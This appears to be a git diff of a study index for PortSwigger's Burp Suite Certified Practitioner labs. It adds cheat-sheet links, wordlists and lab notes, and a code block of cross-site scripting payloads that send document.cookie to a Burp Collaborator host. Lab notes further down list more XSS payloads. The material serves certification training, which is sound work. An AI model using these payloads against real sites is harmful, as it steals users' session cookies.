@@ -1,12 +1,28 @@
 # BSCP
 This file consits of all labs with short decription of vulnerability and/or solution.
 
-# Cheat Sheets
+# PortSwigger Cheat Sheets
+- [SQL Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+- [Obfuscating Payloads](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
+- [URL Validation Bypass](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
+- [Web cache deception delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)
+- [Usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
+- [Passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
+- [JWT Secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)
+
+# Custom Cheat Sheets
 - [GraphQL - Cheat Sheet](/PortSwigger/Advanced_topics/GraphQL_API_vulnerabilities/GraphQL_cheat_sheet.md)
 - [Server-side template injection - Cheat Sheet](/PortSwigger/Advanced_topics/Server-side_template_injection/SSTI_cheat_cheet.md)
 - [HTTP request smuggling - Cheat Sheet](/PortSwigger/Advanced_topics/HTTP_request_smuggling/Request_smuggling_cheat_sheet.md)
 
-
+```js
+<script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
+<img src="http://burp.oastify.com?c='+document.cookie+'" />
+<img src=0 onerror="window.location='http://burp.oastify.com/c='+document.cookie"/>
+fetch('http://burp.oastify.com?c='+btoa(document.cookie))
+javascript:alert(document.cookie)
+```
 
 
 
@@ -151,7 +167,7 @@ This file consits of all labs with short decription of vulnerability and/or solu
 - [Unprotected admin functionality with unpredictable URL](/PortSwigger/Server_Side/Access_control_vulnerabilities/Unprotected_admin_functionality_with_unpredictable_URL.md)
     - Unprotected, unpredictable admin endpoint visible in source code
 - [User role controlled by request parameter](/PortSwigger/Server_Side/Access_control_vulnerabilities/User_role_controlled_by_request_parameter.md)
-    - Admin access contrlled by boolean cookie value
+    - Admin access controlled by boolean cookie value
 - [User role can be modified in user profile](/PortSwigger/Server_Side/Access_control_vulnerabilities/User_role_can_be_modified_in_user_profile.md)
     - User role controlled via client-side `roleid` parameter
 - [User ID controlled by request parameter](/PortSwigger/Server_Side/Access_control_vulnerabilities/User_ID_controlled_by_request_parameter.md)
@@ -339,6 +355,7 @@ This file consits of all labs with short decription of vulnerability and/or solu
     - Stored DOM XSS - `<><img src=0 onerror='alert()'>`
 - [Reflected XSS into HTML context with most tags and attributes blocked](/PortSwigger/Client_Side/XSS/Reflected_XSS_into_HTML_context_with_most_tags_and_attributes_blocked.md)
     - Brute forcing allowed tags
+    - Brute forcing allowed events
     - Reflected XSS - `<body onresize='print()'>`
 - [Reflected XSS into HTML context with all tags blocked except custom ones](/PortSwigger/Client_Side/XSS/Reflected_XSS_into_HTML_context_with_all_tags_blocked_except_custom_ones.md)
     - Reflected XSS - `/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x`
